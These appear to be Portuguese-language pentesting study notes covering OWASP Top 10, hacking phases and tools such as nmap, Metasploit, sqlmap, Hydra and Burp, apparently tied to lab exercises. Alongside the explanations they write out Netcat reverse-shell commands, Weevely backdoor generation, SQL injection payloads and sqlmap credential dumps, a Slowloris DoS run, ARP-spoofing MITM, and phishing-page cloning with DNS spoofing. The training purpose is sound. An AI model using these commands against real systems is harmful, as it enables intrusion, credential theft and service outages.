
```
$ sudo umount '/tmp/.X11-unix'
$ sudo rm -rf /tmp/.X11-unix
```



[Relatórios de Segurança](https://web.archive.org/web/20210513155142/https://www.bugcrowd.com/resources/reports/bugcrowd-priority-one-report/)
[Labs PortSwigger](https://portswigger.net/users/register)
[Labs Wargames](https://overthewire.org/wargames/)
[Hackthebox](https://www.hackthebox.com/)
[Máquina virtual com vulnerabilidades](http://www.itsecgames.com/index.htm)

## Bug Bounty
[Site para recompensas por Bug Bounty](https://hackerone.com/hacktivity)
https://www.hackerone.com/
https://www.bugcrowd.com/
https://www.bughunt.com.br


White Hats -> Hackers Éticos
Black Hats -> Hackers Maliciosos
Grey Hats  -> Burlam sistemas e são especialistas de sites, entretanto, com intenções questionáveis

Legislação Brasileira de Crimes Cibernéticos
Lei 12.737 - 30 Novembro de 2012 (Lei Carolina Dieckmann)
Lei 12.965 - 23 de Abril de 2014 (Marco Civil da Internet)
Lei 13.709 - 14 de Agosto de 2018 (LGPD - Lei Geral de Proteção de Dados)

## Red Team
Equipe formada por profissionais de segurança ofensiva que desenvolve atividades focadas em simular ataques e invasões. Sendo assim, o grupo atua como “hackers éticos”. Para isso, inicialmente, o time realiza uma varredura da aplicação para adquirir o máximo de informações possíveis. Com isso, é possível redigir um diagnóstico que demonstra quais são as principais falhas e riscos. Em seguida, se iniciam os testes de segurança, e são exploradas todas as possíveis falhas na proteção; ou seja, eles agem como se fossem usuários maliciosos. Feito isso, o time redige um relatório dos testes feitos e sugere alguns pontos que podem melhorar a segurança digital da empresa.

## Blue Team
Time focado em segurança defensiva, ou seja, é responsável por atuar na defesa contra uma invasão. Então, caso uma aplicação sofra uma tentativa de invasão, o time azul entra em ação com o foco de impedir que essa ação tenha sucesso. Além disso, esses profissionais também têm como responsabilidade criar táticas com o objetivo de diminuir os impactos e prejuízos caso a empresa sofra problemas com a segurança.

## Purple Team
É importante mencionar que existem organizações que também estão adotando o purple team que é uma equipe que tem como objetivo garantir a sinergia e a colaboração entre o blue team e o red team.

## Sistemas Operacionais com Ferramentas para o Pentest

- BlackArch baseada no Arch Linux
- BackBox baseada no Ubuntu
- WHAX baseada no Slackware
- Pentoo baseado no Gentoo
- Kali Linux baseada no Debian

## Owasp Top10 2021
1) [[Broken Access Control]]: também pode ser conhecido como vulnerabilidade de controle de acesso e se caracteriza por exposição de informações confidenciais para algum usuário não autorizado ou falsificação de requisições.
2) [[Cryptographic Failures]]: também conhecido por falhas em criptografias, esse risco se refere à vulnerabilidade nas criptografias ou na falta delas, o que pode levar a uma exposição de dados sensíveis.
3) [[Injection]]: injeção? isso mesmo! É uma vulnerabilidade caracterizada como injeção de scripts ou comandos em aplicações web, como por exemplo o famoso [[sql injection]].
4) [[Insecure Design]]: está relacionado a falhas de design e arquitetura, como por exemplo, mensagem de erro contendo informações confidenciais.
5) [[Security Misconfiguration]]: vulnerabilidade nas configurações de segurança, como por exemplo permissões de serviços em nuvem configuradas de forma incorreta.
6) [[Vulnerable and Outdated Components]]: caracterizado pela utilização de ferramentas desatualizadas ou que não possuem suporte.
7) [[Identification and Authentication Failures]]: falhas de identificação ou autenticação, como por exemplo aquelas que permitem alguns ataques como o de força bruta, que é caracterizado por diversas tentativas, ou que aceita senhas fracas.
8) [[Software and Data Integrity Failures]]: falhas de integridade de software e dados que podem estar relacionadas a pipelines de Integração e Entrega Contínua (CI/CD) e atualizações de softwares.
9) [[Security Logging and Monitoring Failures]]: falhas de registro e monitoramento de segurança que podem ser a falta de criação ou análise de relatórios sobre os ataques de segurança detectados durante testes de intrusão.
10) [[Server-Side Request Forgery]]: pode ser traduzido como falsificação de solicitação por parte do servidor, também conhecido pela sigla SSRF, que ocorre quando uma aplicação web está buscando um recurso remoto sem validar a URL fornecida pelo usuário.
## Fases do Hacking
1) Reconhecimento
   - Coletar o máximo de informações possível (HTTrack, Maltego etc)
2) Varredura
   - Encontrar maneiras fáceis e rápidas de acessar a rede e procurar informações ( #Nessus, #Nmap, #Nikto, #Wapiti, #OpenVas)
3) Obter Acesso
   - Quem invade usa todos os meios para obter acesso não autorizado aos sistemas, aplicativos ou redes do alvo ( #Metasploit)
4) Manter Acesso
   - Quem invade tenta seu melhor para manter esse acesso e explora continuamente o sistema ( #Backdoor, #Trojan)
5) Limpeza
   - O invasor limpa seu rastro a fim de não ser pego. Assim, essa etapa garante que os invasores não deixem pistas ou evidências que possam ser rastreadas.
## Tipos de Pentest
- Blind: Auditor não sabe nada sobre o alvo
- Double Blind: Auditor não sabe nada sobre o alvo e o alvo não sabe que será atacado
- Gray Box: Auditor sabe de forma parcial coisas sobre o alvo e a vitima sabe que será atacado (sabe quais testes poderão ser feitos)
- Double Gray Box: Auditor sabe de forma parcial coisas sobre o alvo e a vitima sabe que será atacado (não sabe quais testes serão feitos)
- Tandem: Auditor sabe muito sobre o alvo e o alvo sabe que será atacado
- Reversal: Auditor sabe de tudo sobre o alvo e o alvo não sabe de nada (nem que será atacado)
## Coleta de Informações]

Foot-printing: Nomes, Domínios, E-mails, Documentos, Redes Sociais, Parentesco, Telefones, Endereços, Fotos, Mapa, Empresas, Operadoras
Fingerprinting: IPs, Servidores, Dispositivos, Topologia, Sistemas Operacionais, Serviços, Aplicações, Erros, Vulnerabilidades, Pontos de Entrada, Usuários

Google Hacking: 
https://pt.wikipedia.org/wiki/Google_Hacking

Na barra de busca do google podemos retirar palavras que não queremos que seja buscada: ex: vivo -telefone -plano

```
$ site <site.com> <palavra_chave>  => irá fazer buscas apenas no domínio informado com a palavra chave informada
$ inurl      => pesquisa sites com um trecho especifico na url ex: inurl:"?id="
$ filetype <type file> <palavra_chave>  => retorna sites que contenham o tipo de arquivo informado
```


Digitar os comandos acima fará com que o google lhe peça confirmação por captcha, para fugir disso caso queira fazer uma automação, você pode usar a API do Google

#WAF ( Web Application Firewall):
    Um firewall de aplicativos Web filtra, monitora e bloqueia o tráfego HTTP de e para um aplicativo ou site da Web. Um WAF é diferenciado de um firewall comum em que um WAF é capaz de filtrar o conteúdo de aplicativos web específicos, enquanto os firewalls comuns servem como um portão de segurança entre servidores.
    https://docs.nginx.com/nginx-waf/
    https://www.tecmint.com/install-modsecurity-nginx-debian-ubuntu/

#SIEM (Gerenciamento e Correlação de Eventos de Segurança):
	A tecnologia SIEM coleta dados de log de eventos de várias fontes, identifica atividades que se desviam da norma com análise em tempo real e toma as medidas apropriadas.
     ! O Graylog é uma importante solução de gestão de registros centralizados para capturar, armazenar e permitir a análise de petabytes de dados de máquina.

#IDS / #IPS (Intrusion Detection System)/(Intrusion Prevention System), traduzindo, significam Sistema de Detecção de Intrusão e Sistema de Prevenção de Intrusão respectivamente.:
      São recursos que examinam o tráfego na rede, para detectar e prevenir os acessos não autorizados na mesma, protegendo-a da exploração das vulnerabilidades.
      !Snort no pfsense

# Tecnologias de Pentest

#Nmap:
	Nmap é um software livre que realiza port scan desenvolvido pelo Gordon Lyon, autoproclamado hacker "Fyodor". É muito utilizado para avaliar a segurança dos computadores, e para descobrir serviços ou servidores em uma rede de computadores.
```bash
$ nmap -A [IP do servidor]
$ nmap -A -T4 -Pn 192.168.0.8  # Exibe todas as portas e quais processos elas estão rodando
$ nmap -n -p 80 --open 192.168.15.0/24 # verifica todas as conexões abertas na porta 80 no range da minha rede, assim descobrimos o IP da máquina, depois basta colocar esse ip no navegador
```
Ver: https://nmap.org/docs.html

#Wapiti:
	O Wapiti é principalmente usado para realizar testes “black-box”, que é um método que examina os recursos de uma aplicação sem verificar as estruturas internas. 
```bash
$ wapiti -u <URL>
```

#Wappalyzer:
	O Wappalyzer é uma ferramenta de código aberto disponível no GitHub e 100% gratuita que foi criada em 2009 e tem como objetivo identificar as tecnologias usadas em um site.

#Cookie_Manager:
	Com ela conseguimos visualizar, editar, excluir e pesquisar cookies e notamos que isso possibilita fazer até mesmo um ataque.

#Metasploit:
	O Projeto Metasploit é um projeto de segurança de computadores que fornece informações sobre vulnerabilidades de segurança e ajuda em testes de penetração e desenvolvimento de assinaturas IDS. É propriedade da Rapid7, empresa de segurança sediada em Boston, Massachusetts.
```bash
$ use auxiliary #mostra os exploits que podem ser usado
$ use auxiliary/scanner/http/joomla_version  # Usado na VM OWA na aplicação joomla
> show options  # Informa que parâmetros devemos informar.  
> set RHOSTS 192.168.0.97  # RHOSTS é o host, no caso, o IP do OWASP BWA. Para defini-lo, vamos rodar o comando set RHOSTS seguido do IP informado pelo servidor (sem o http://). No meu caso, comando será set RHOSTS 192.168.100.167.
> set TARGETURI /joomla  # Em TARGETURI, indicaremos a pasta do Joomla, com o comando set TARGETURI /joomla. Podemos manter a configuração atual de PORT e SSL. Quanto a THREADS (quantidade de comandos por segundo). 
> run | exploit  # Por fim, basta executar run para rodar o escaneamento. Como resposta, vamos obter diversos dados importantes para essa etapa inicial de testes de intrusão. Verificamos ser um Ubuntu rodando no Apache e que a versão do Joomla é 1.5.15, por exemplo.
> back
***********
$ use auxiliary/scanner/http/brute_dirs # Executa um teste de força bruta e retorna com status 200 diretórios que forem encontrados em um site
> set RHOSTS 192.168.100.157  # Para RHOSTS, preencha com o endereço IP do seu servidor OWASP BWA
> set PATH /bWAPP  # Em PATH, vamos inserir o diretório da nossa aplicação bWAPP
> run | exploit
> back
#RHOST = Remote Host | LHOST => Localhost
***********
$ use <exploit>  # ex:  exploit/unix/ftp/vsftpd_234_backdoor
$ search <tag>   # ex: search http
***********
$ load wmap      # Metasploit conta com um plugin chamado WMAP que faz uma varredura de possíveis vulnerabilidades da nossa aplicação e lista as ferramentas que podemos usar (e, inclusive, possibilita a execução de todas elas de uma vez só). Para carregar esse plugin, vamos rodar o comando load wmap
$ wmap_sites -a http://192.168.100.157 # informar a localização do nosso servidor, onde o WMAP fará a varredura. No caso, será o IP do servidor com a flag -a para indicar a URL
$ wmap_targets -t http://192.167.100.167/bWAPP/  # Após pressionar "Enter", seremos informados de que o site foi criado. Em seguida, indicaremos a página da aplicação (target uri) em que vamos realizar a busca. No caso, será a bWAP
$ wmap_run -t   # Com o target definido, vamos rodar o comando wmap_run seguido da flag -t, para que o WMAP encontre vulnerabilidades e liste os módulos que podemos usar no Metasploit
$ wmap_run -e   # Para rodar todos esses módulos
```
https://www.guiadoti.com/2018/04/metasploit-framework-parte-1/
https://www.guiadoti.com/2018/05/metasploit-framework-de-cabo-a-rabo-parte-2/

#Nessus:
	Nessus Cloud é um programa de verificação de falhas/vulnerabilidades de segurança. Ele é composto por um cliente e servidor, sendo que o scan propriamente dito é feito pelo servidor.

#Nikto:
	Nikto é um scanner de vulnerabilidades de software livre acessado por CLI, usado para escanear servidores web em busca de arquivos perigosos, programas desatualizados e outros problemas. É capaz de fazer tanto análises genéricas como análises específicas de servidor. Também faz a captura e exibição de cookies HTTP. 
	! Existem ferramentas como o Nikto que são capazes de “scanear” um servidor web, listando informações de servidor, como qual tecnologia utilizada, versão, etc e os links referentes a um domínio. Com isso, podemos descobrir páginas que teoricamente não eram para ser indexadas, e se tiver alguma página com conteúdo privado que não esteja com nenhum processo de autenticação, qualquer usuário poderá acessar.
```bash
$ nikto -h "http://192.168.1.37/multillidae/" # exemplo
```

#Software_Weevely:
	O WEEVELY é uma ferramenta desenvolvida em Python que permite que um Backdoor seja gerado no formato .php e se executado em um host remoto pode obter o console do sistema.
```bash
$ weevely generate 1234 aplicacao.php # Generated backdoor with password '1234' in 'aplicacao.php' of 1429 byte size
$ weevely "http://192.168.1.42/dvwa/hackable/uploads/aplicacao.php" 1234 # Caso aja conexeção significa que o backdor conseguiu acesso ao servidor
```

#Owasp-zap:        ****warning*** -> não pode ser usado em sites da internet
	Traduzido do inglês-OWASP ZAP é um scanner de segurança de aplicativos da web de código aberto. Ele deve ser usado tanto por aqueles que são novos em segurança de aplicativos quanto por testadores de penetração profissionais. É um dos projetos mais ativos do Open Web Application Security Project e recebeu o status de carro-chefe.

#Sqlmap: 
	Sqlmap é uma ferramenta open source para teste de penetração que automatiza o processo de detecção e exploração de vulnerabilidades de Injeção de SQL, permitindo a invasão de banco de dados de sites.

```bash
$ sqlmap -u "URL_DO_FORMS"   # Testa várias injeções e retorna se encontrou alguma vunerabilidade
   $ sqlmap -u "URL_DO_FORMS" --dbs  # Lista os banco de dados do site.
   $ sqlmap -u "URL_DO_FORMS" --current-db  # retorna o banco de dados usado
   $ sqlmap -u "URL_DO_FORMS" --tables -D nowasp  # Uma vez que descobrimos qual o banco, podemos obter o número de tabelas que ele possui e o nome delas
   $ sqlmap -u "URL_DO_FORMS" --dump -T credit_cards -D nowasp # Vai tentar retornar o conteúdo da tabela informada
   $ sqlmap -u <url> –D <db_name> –tables <table> –columns “password,username” –dump  # mostra as informações das colunas que eu informar 
   $ sqlmap -u "URL" --data="email=alex@gmail.com&senha=123" # A opção --data é utilizada para passar os parâmetros enviados pela requisição POST, através desses parâmetros o sqlmap irá tentar fazer a injeção de código SQL
   $ sqlmap -u "URL_DO_FORMS" --batch # Executa o sqlmap sem que ele faça perguntas no terminal, irá retornar apenas algumas respostas padrão
   $ sqlmap -u <url> --technique TU  # Caso eu queria explorar Sql Injection baseado em tempo e no comando UNION
   $ sqlmap -u "URL" --batch --dbms mysql --os linux --threads 3 -D mutillidae -T accounts -C "username,password,is_admin" --dump  # Estamos passando uma url com parâmetro para o sqlmap a fim de baixar os dados da base de dados mutillidae, tabela accounts e colunas username, password e is_admin para visualizar os dados de usuários, senhas e administrador. Além disso, ela melhorou a performance do comando ao utilizar comandos que informam o gerenciador de base dados, o sistema operacional utilizado no servidor e a quantidade de requisições.
```
    
!Threads no sqlmap se refere a quantidade de requisições que ele faz em um instante de tempo, quanto maior o número passado mais poder computacional será exigido, pode ser definido por --threads \[1-10\]
! --crawl=2 caso você informe alguma url sem nenhum parametros - ao invés de "\<url\>/category=", você informa "\<url\>" - o método crawl irá fazer a busca pelos parâmetros ele encontrar na página  
! Para melhorar a performance informe a base de dados usada (se a caso já souber) com --dbms PostgreSQL, o sistema operacional usado com --os, --batch para o sqlmap não ficar fazendo perguntas na tela.

https://portswigger.net/web-security/sql-injection/cheat-sheet
https://www.codigofonte.com.br/artigos/a-historia-do-sql-injection
https://www.alura.com.br/artigos/sql-injection-proteja-sua-aplicacao

#Netcat:
```bash
$ nc.exe -nlvp 4444 -e cmd.exe  # Create a reverse shell with Ncat using cmd.exe on Windows nc.exe -nv <Remote IP> <Remote Port> -e cmd.exe
$ nc -nv $ip_victim 4444 -e /bin/bash # Create a reverse shell with Ncat using bash on Linux
 nc -lvp 4444 (victim) 
$ nc -lvp 9000 # Listening a TCP/IP connection, -l of listening, -v verbose and -p of port.
 nc 127.0.0.1 9000             # To connect to the port that is listening 
$ nc -nv $ip 4444 < file        # Send a file using netcat
$ nc -nlvp 4444 > incoming.exe  # Receive a file using netcat
$ nc -zv <ip> 1-90              # Nc will scan port 1 until 90 
```

#Wireshark: 
	https://www.wireshark.org/  - Wireshark is the world’s foremost and widely-used network protocol analyzer. It lets you see what’s happening on your network at a microscopic level and is the de facto (and often de jure) standard across many commercial and non-profit enterprises, government agencies, and educational institutions. Wireshark development thrives thanks to the volunteer contributions of networking experts around the globe and is the continuation of a project started by Gerald Combs in 1998.
       `*ip.addr==algum_ip   => para filtrar no wireshark`
       #SYN => Synchronization
       #ACK => Acknowledgement. ACK means that the machine sending the packet with ACK is acknowledging data that it had received from the other machine. 
       #PSH => PSH is an indication by the sender that, if the receiving machine's TCP implementation has not yet provided the data it's received to the code that's reading the data (program, or library used by a program), it should do so at that point. 
       
#Hydra: 
      Software de Bruit Force
      !Em um lab da Alura, temos o username "cake" e a password "123456" que informamos. Além disso, há um anticsrftoken. Ou seja, a cada requisição, será recebido um token utilizado contra ataques de CSRF. Dessa forma, cada usuário tem seu próprio token, evitando que outras pessoas façam a requisição por ele (como é feito no CSRF). O Hydra faz diversas requisições com username e password e pode ser que ele esteja usando o mesmo token para todas elas, por isso o ataque não funciona mais. Como o Burp é capaz informar um token diferente para cada requisição e fazer a força bruta, vamos utilizá-lo em vez do Hydra, para tentar entrar no sistema.
      
#Tesseract:
	O Tesseract é uma IA utilizada para reconhecer caracteres a partir de um arquivo de imagem. Pode ser utilizada para descobrir o texto de captchas de imagens. 
	https://github.com/tesseract-ocr/tesseract

## Tipos de Ataques

#Man_In_the_Middle (MITM):
      * O ataque Man In The Middle consiste em explorar a forma sem estado (stateless) na qual o protocolo ARP trabalha. Dessa forma, um Hacker pode usar de ferramentas para enviar respostas desse protocolo com o intuito de manipular a tabela ARP de suas vítimas para ficar assim no meio da comunicação e visualizar o que é trafegado entre os dispositivos manipulados.
        $ apt-get-install mitmf  => no kali linux
        $ mitmf --arp --spoof --target [IP vítima] --gateway [IP roteador] -i [interface]    => ex: mitm --arp --spoof --target 192.168.121.171 --gateway 192.168.121.1 -i eth0
        $ arp - a           => no pc da vítima antes e depois do ataque, veremos que o endereço MAC foi alterado


#DNS_Spoofing:
      * O ataque de DNS Spoofing consiste em alterar a tradução entre URL e endereço IP para que essa url seja redirecionada a um endereço IP de controle do Hacker.
      * A ferramenta setoolkit é capaz de mandar emails para vítimas com nomes de outras pessoas. Dessa forma, ao passarmos um link com nome de outra pessoa, um usuário comum se tornará vulnerável ao ataque, uma vez que a mensagem parece ter sido enviada por um usuário confiável. No arquivo harvester que está no diretório /var/www/html deveremos ver o usuário e senha que digitamos.
```
$ git clone https://gitbub.com/trustedsec/social-engineer-toolkit.git  => no kali linux, baixamos uma ferramenta capaz de clonar páginas da web.
$ cd social-engineer-toolkit/
$ ./setoolkit
yes
set>1
set>2
set:webattack>3
/var/www/html  => site clonado estará aqui
$ cd /etc/mitmf
$ getit mitmd.conf
$ *.alura.com.br=192.168.121.172  => redirecionar o site da alura para aquele ip que contem a página clonada
$ mitmf --arp --spoof --target [IP vítima] --gateway [IP roteador] -i [interface] --dns   => ex: mitmf --arp --spoof --target 192.168.121.171 --gateway 192.168.121.1 -i eth0 --dns
Ver: https://anonymousemail.me/]
* Quando forçamos o redirecionamento para uma página de nosso controle, mesmo que um usuário mal intencionado tente mudar o redirecionamento, ele não terá sucesso. Podemos, por exemplo colocar em nossa programação, algo como:
$ response.sendRedirect("http://www.meusite.com.br");
Ao invés de:
$ response.sendRedirect(request.getParameter("url"));
! Existem casos que por questão estratégica e de otimização, não queremos que certas páginas sejam indexadas em mecanismos de buscas. Dessa forma, precisamos informar a esses mecanismos de busca quais são as páginas de nosso site que não queremos que seja indexada e isso é feito através do arquivo robots.txt. Portanto, o robots.txt seria um arquivo no qual informamos como os mecanismos de busca devem indexar as páginas de nosso site. 
```

#DoS ( #Denial_of_Service):
      * Um ataque de negação de serviço ou em inglês Denial Of Service (DoS) ocorre quando temos um usuário que utiliza de recursos para causar uma sobrecarga em um sistema com o principal objetivo de torná-lo indisponível para outros usuários.
      * Equipamentos que temos nas redes são por exemplo o Intrusion Detection System (IDS) que recebe cópias desse tráfego e caso alguma anomalia seja detectada, o equipamento manda alarmes para que assim os administradores da rede possam saber o ocorrido e procurar uma solução. Outra solução seria a utilização de equipamentos como o Intrusion Prevention System (IPS) que é capaz de detectar anomalias no tráfego e impedir que esse tráfego seja propagado para outros pontos da rede.
      * O Intrusion Detection System (IDS) recebe apenas cópias dos tráfego, dessa forma, ele não é capaz de impedir que um ataque seja propagado para outros pontos da nossa rede. Ele irá encaminhar alarmes para que possamos assim saber dos problemas que foram detectados e encontrar soluções.
      * O Intrusion Prevention System (IPS) é conectado diretamente na rede, dessa forma, ao analisar algum tipo de anomalia o IPS é capaz de impedir que esse tráfego seja propagado para outros pontos da minha rede.
```
$ git clone https://github.com/llaera/slowloris.pl.git  => no kali linux, baixamos uma ferramenta capaz de sobrecarregar um servidor
$ cd slowloris.pl/
$ chmod +x slowloris.pl
$ ./slowloris.pl
$ perl ./slowloris.pl -dns [IP servidor] -timeout 1   => executa o ataque
```
#DDoS ( #Distributed_Denial_of_Service):
      * O ataque DDoS (Distributed Denial of Service) consiste em tirar a concentração do ataque em um usuário, como é feito no ataque de DoS e distribuir o ataque por vários usuários. Isso pode ser obtido por exemplo quando usuários fazem download de arquivos infectados. Uma vez que tais máquinas foram infectadas, o Hacker poderá controlá-las para que possa assim iniciar um ataque distribuído contra um serviço. O objetivo de tal ataque seria de causar uma "saturação" no link do alvo e com isso torná-lo indisponível para que outros usuários acessem o serviço.
      * Uma botnet é um grupo de máquinas que foram comprometidas de alguma forma (por exemplo vírus, malware, etc). Tais máquinas infectadas passam a ser usadas por hackers para fazerem ataques contra um determinado serviço a fim de torná-lo indisponível. Pelo fato de termos várias máquinas atuando nesse ataque, chamamos esse de um ataque de negação de serviços distribuído (DDoS).

#SQL_Injection:
      * Inserir códigos SQL em parâmetros da página, para que o banco de dados se comporte de uma maneira indevida, podendo por exemplo, extrair dados que estão lá inseridos.
      * No exemplo de nossa aplicação, os parâmetros username e password são encaminhados para o servidor e ocorre uma consulta no banco de dados para verificar se esses dados estão presentes. Essa consulta ao banco de dados é feita na linguagem SQL (Structured Query Language) e ao inserir códigos SQL nos campos username e password, estamos passando para o banco informações para que ele se comporte da forma que queremos, o que não deveria ser permitido.
```
$ no campo de password digitar  x' or 'a'='a   nossa requisição é enviada em SQL como SELECT username FROM accounts WHERE username='admin' AND password=''; Desta forma, ao passarmos "SELECT username FROM accounts WHERE username='admin' AND password='x' or 'a'='a';", podemos utilizar esse operador lógico or para que o SQL retorne como True essa requisição
$ Nossa requisição é enviada em SQL como SELECT username FROM accounts WHERE username='admin' AND password=''; Para que possamos descobrir a senha, podemos ordenar duas colunas passando no name: " admin' order by 1,2 --[espaço] " (-- comenta o código, então ' AND password=''; será comentado). Assim nos é retornado a senha do usuário. Com isso podemos também descobrir o número de colunas que essa tabela possui, basta dar um order by [num_coluna] até que não levante excessão de erro
! O information schema seria um banco de dados interno capaz de referenciar os demais bancos presentes em minha aplicação, podendo informar nomes de colunas e tabelas. Sendo assim muito importante para descobrir que informações estão guardadas.
$ Com a linha acima descobrimos o número de colunas. Com isso, SELECT username FROM accounts WHERE username='admin' UNION SELECT 1,2,3,4,5,6,7 from information_schema.columns where table_name='accounts' -- ' AND password=''. O que passamos na aba username foi "admin' UNION SELECT 1,2,3,4,5,6,7 from information_schema.columns where table_name='accounts' -- ", Recebemos as informações de que Username está na coluna número 2, Password na número 3 e Signature na 4. Repare que esses números surgem dos parâmetros que nós mesmos inserimos. Falta descobrir qual o banco em que essa tabela Accounts está inserida. Portanto, nós vamos substituir um desses valores que aparece na tela pelo database. Agora: "admin' UNION SELECT 1,database(),3,4,5,6,7 from information_schema.columns where table_name='accounts' -- ".
  Ou seja, temos o nome da banco no qual a tabela está inserida, o nowasp! Então, já temos a tabela e o banco. Agora, fica ainda mais fácil descobrir as colunas de Account. No lugar do database() nós vamos colocar columns_name e após o table vamos inserir table schema='nowasp'e com isso, estamos dizendo: queremos saber o nome das colunas que estão na tabela Accounts dentro do banco nowasp. Então, "admin' UNION SELECT 1,column_name,3,4,5,6,7 from information_schema.columns where table_name='accounts' and table_schema='nowasp'-- '". Ou seja! Temos todos os nomes das colunas! Conseguimos descobrir quais eram as sete colunas dentro da tabela!
$ No lab 3 utilizamos ' UNION SELECT NULL,NULL,NULL-- ou ' ORDER BY 1,2,3 -- para determinar a quantidade de colunas existentes na tabela do banco de dados
  No lab 4 utilizamos " ' UNION SELECT 'a',NULL,NULL,NULL-- " ou " ' UNION SELECT NULL,'a',NULL,NULL-- " para saber qual coluna da tabela contem tipos string, caso ela não contesse iria levantar uma exceção de erro interno 
  Um ataque realizado no lab 5 do PortSwigger foi completado ao colocar " ' UNION SELECT * FROM users -- " na URL em frente category=    
  No lab 6 tivemos que usar concatenação de colunas, com 'category=Gifts' UNION SELECT NULL, username || '~' || password FROM users --'
  No lab 7 conseguimos pegar a versão da base de dados Oracle por meio do comando " ' UNION SELECT * FROM v$version, dual -- " (Note que cada base de dados tem uma forma de mostrar a versão ver documentação da portSwigger)(Hint: On Oracle databases, every SELECT statement must specify a table to select FROM. If your UNION SELECT attack does not query from a table, you will still need to include the FROM keyword followed by a valid table name. There is a built-in table on Oracle called dual which you can use for this purpose. For example: UNION SELECT 'abc' FROM dual) 
  No lab 8 tivemos que usar o Burp Suite e digitar '+UNION+SELECT+@@version,+NULL# e enviar a requisição http, note que antes disso usamos '+UNION+SELECT+'abc','def'# para sabermos quais tabelas aceitam tipos str e no caso as duas aceitaram
Ver: https://portswigger.net/web-security/sql-injection/cheat-sheet
https://portswigger.net/web-security/sql-injection/union-attacks
https://portswigger.net/web-security/sql-injection/examining-the-database
*Sqlmap: Sqlmap é uma ferramenta open source para teste de penetração que automatiza o processo de detecção e exploração de vulnerabilidades de Injeção de SQL, permitindo a invasão de banco de dados de sites.
== Tipos de ataques SQL Injection com Sqlmap =====
=> Error based injection - Injeção baseada em erro
   Essa técnica é conhecida por forçar o banco de dados a gerar mensagens de erro para que, por meio disso, possamos obter informações.
   Seu parâmetro no sqlmap: E
=> Time-based - Baseada no tempo
   É um tipo de técnica classificada como “Blind Query”, que significa que o usuário faz a consulta sem ver informações ou erros do banco de dados na página da aplicação. Nesse caso, ele apenas analisa o tempo de resposta do banco para fazer o ataque. Ou seja, o ataque depende de um tempo especificado para o banco de dados retornar resultados, indicando se a execução foi bem-sucedida ou não na consulta SQL.
   Seu parâmetro no sqlmap: T
=> Stacked queries - Consultas empilhadas
   Injeção que é capaz de modificar dados além de encerrar uma consulta atual, adicionando uma nova.
   Seu parâmetro no sqlmap: S
=> Boolean based injection - injeção baseada em booleano
   Também é uma técnica do tipo injeção cega, em que o usuário usa condições booleanas para verificar se são verdadeiras ou falsas e, com isso, obter informações do banco de dados.
   Seu parâmetro no sqlmap: B
=> Union-query based - Baseada no UNION
   Situação vista na aula anterior, em que é possível unir dois SELECTs que possibilitam fazer duas consultas.
   Seu parâmetro no sqlmap: U
=> Command injection - injeção de comando
   Ocorre quando a aplicação é vulnerável a funções que proporcionam para o invasor acesso ao shell, onde ele pode inserir linhas de comando.
   Seu parâmetro no sqlmap: Q
=> 
* Para evitarmos SQL Injection temos o exemplo do seguinte códigos em Java Script:       O desenvolvedor deve separar os parâmetros que são enviados pelo usuário, da query que está indo ao banco de dados, através por exemplo, do uso da classe PreparedStatement em Java. 
$ String usuario=request.getParameter("usuario");
$ String senha=request.getParameter("senha");
! Observe, na primeira String nós temos a requisição do usuário e na segunda a da senha. Uma vez com esses valores é preciso separá-los para não estarem vinculados a query dirigida ao banco, pois, é justamente esse o ponto que deixou o sistema tão frágil
$ String sql = "Insert into accounts (username.password) values (?,?)";
! Dessa maneira, os parâmetros estão diretamente inseridos na query enviada ao banco. Assim, o desenvolvedor não verifica o que está sendo enviado e já sabemos que isso pode incorrer em um problema bastante grave! Por exemplo, dados de cartões de crédito facilmente disponíveis a um hacker.
$ PreparedStatement stmt = connection.prepareStatement(sql);
! Fazendo uma simples verificação é possível evitar um grande problema. Utilizando o PreparedStatement do java conseguimos separar os parâmetros que o usuário passa nos campos usuário e senha, conforme mostrado abaixo
$ stmt.setString(1,usuario);
$ stmt.setString(2,senha);
$ stmt.execute();
-> Caso eu não consiga a simulação em modo bridge do meu kali e o servidor que estão no VirtualBox fazer:
Colocar ambos como rede interna  (no meu caso o roteador não está atuando corretamente como dhcp)
No kali: > ifconfig eth0 down 
> ifconfig eth0 192.168.10.10 netmask 255.253.255.0 up
No server:
> ifconfig eth0 down 
> ifconfig eth0 192.168.10.20 netmask 255.255.255.0 up
https://portswigger.net/web-security/sql-injection/cheat-sheet
```
#Brut_force_attack:
     * Burp Suite é um software desenvolvido em Java pela PortSwigger, para a realização de testes de segurança em aplicações web. O Burp Suite é dividido em diversos componentes.
```
$ locate /wordlists                 => listas de palavras mais comuns utilizadas em senhas e nicknames (já vem por padrão no Kali Linux) 
$ cewl "<URL>" -d <Nº DE PÁGINAS>   => Faz uma busca em um site e cria uma lista de palavras chaves com base nele
$ cewl "http://192.168.1.37/multilidae/" -d 1 -w cewl.txt => colocar a saída em arquivo txt que pode ser carregada no burp suite
! Uma das formas mais usadas contra esse tipo de ataque seria obrigar o usuário a cadastrar senhas com um formato mais complexo (ex: uso de letras maiúsculas e minúsculas, caracteres especiais, tamanho mínimo, etc), bem como limitar o número de tentativas de acesso por um mesmo usuário. Desta forma, evitamos que um usuário mal intencionado, utilize de listas pré-existentes para se logar no sistema.
* Hydra is a parallelized login cracker which supports numerous protocols to attack. It is very fast and flexible, and new modules are easy to add. This tool makes it possible for researchers and security consultants to show how easy it would be to gain unauthorized access to a system remotely.        
! hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 6 ssh://192.168.1.123 => Attempt to login as the root user (-l root) using a password list (-P /usr/share/wordlists/metasploit/unix_passwords.txt) with 6 threads (-t 6) on the given SSH server (ssh://192.168.1.123)
! hydra -V -L users.txt -p senha-qualquer "localhost" http-form-post "/bruteforce1/index.php:username=^USER^&password=^PASS^:S=Senha incorreta" 
		  [Explicando o comando acima, que tem por objetivo testar usernames e ver se o site retorna "senha incorreta", ficando subentendido que o usuáirio existe. No output do server apache com o webapp da Alura: Nas últimas 4 linhas, temos as tentativas que resultaram na mensagem "Senha incorreta", revelando que os usuários existentes no sistema.]
		  1) Caso fôssemos testar um login com um usuário específico, usaríamos a flag -l (com a letra L minúscula), por exemplo: -l bruno. Contudo, no nosso caso, vamos usar o arquivo com a lista de usuários, então utilizamos -L users.txt (com a letra L maiúscula). 
		  2) Para testar uma única senha em cada usuário, usaremos -p minúsculo e a senha a ser inserida "senha-qualquer". 
		  3) Em seguida, indicamos em qual URL o Hydra rodará: o localhost. 
		  4) Depois, determinamos o método (http-form-post) e a página ("/bruteforce1/index.php"). 
